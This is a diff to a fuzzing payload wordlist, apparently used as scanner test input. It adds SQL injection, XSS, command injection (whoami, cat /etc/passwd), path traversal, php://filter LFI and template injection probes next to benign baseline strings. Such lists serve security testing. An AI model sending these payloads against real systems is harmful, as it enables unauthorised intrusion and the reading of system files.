@@ -1,31 +1,50 @@
-# --- Benign (基准) ---
-test_safe_1
-1
-0
-
-# --- SQL Injection (报错与布尔盲注特征) ---
+# --- Benign (基准，进一步精简至 4 条) ---
+test_safe_string
+hello_world
+ok
+ready
+# --- SQL Injection (Basic & Blind) ---
 '
 "
-' OR 1=1 -- 
-" OR 1=1 -- 
+' OR 1=1 --
+" OR 1=1 --
 ') OR ('1'='1
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- 
-' AND sleep(5) -- 
+' UNION SELECT 1,2,3,4,5 --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --
+' AND sleep(5) --
+1' AND 1=1 #
+1' AND 1=2 #
 
-# --- XSS (各种标签绕过) ---
+# --- XSS (Reflected & Stored) ---
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg/onload=alert(1)>
 '"><script>alert(1)</script>
 javascript:alert(1)
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
 
-# --- Command Injection (多平台兼容) ---
+# --- Command Injection (Linux & Windows) ---
 ; whoami
 | whoami
 & whoami
 `whoami`
-|| type C:\Windows\win.ini
+|| whoami
+; cat /etc/passwd
+| type C:\Windows\win.ini
+& ping -c 1 127.0.0.1
 
-# --- Path Traversal ---
+# --- Path Traversal / LFI ---
 ../../../../../../../../etc/passwd
 ..\..\..\..\..\..\..\..\windows\win.ini
+/etc/passwd
+C:\Windows\win.ini
+php://filter/convert.base64-encode/resource=index.php
+
+# --- SSTI (Server Side Template Injection) ---
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{{config}}
+
+# --- Benign (精简结束) ---
